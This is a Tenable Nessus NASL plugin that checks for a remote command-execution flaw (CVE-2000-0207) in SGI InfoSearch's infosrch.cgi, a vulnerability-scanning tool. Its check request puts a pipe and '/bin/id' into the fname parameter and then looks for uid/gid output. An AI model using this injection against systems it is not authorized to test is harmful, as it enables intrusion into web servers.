#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10128);
 script_version ("$Revision: 1.36 $");

 script_cve_id("CVE-2000-0207");
 script_bugtraq_id(1031);
 script_osvdb_id(102);

 script_name(english:"SGI InfoSearch infosrch.cgi fname Parameter Arbitrary Command Execution");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is hosting a CGI application that is affected
by a remote command execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote web server is hosting the 'infosrch.cgi' script. The
installed version of this script fails to properly sanitize user-
supplied input to the 'fname' variable. An attacker, exploiting this
flaw, could execute arbitrary commands on the remote host subject to
the privileges of the web server user." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Mar/41" );
 script_set_attribute(attribute:"solution", value:
"Apply the patches from the vendor." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploithub_sku", value:"EH-12-585");
  script_set_attribute(attribute:"exploit_framework_exploithub", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/03/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/03/02");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:"Checks for the presence of /cgi-bin/infosrch.cgi");

 script_category(ACT_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

http_check_remote_code (
			check_request:"/infosrch.cgi?cmd=getdoc&db=man&fname=|/bin/id",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
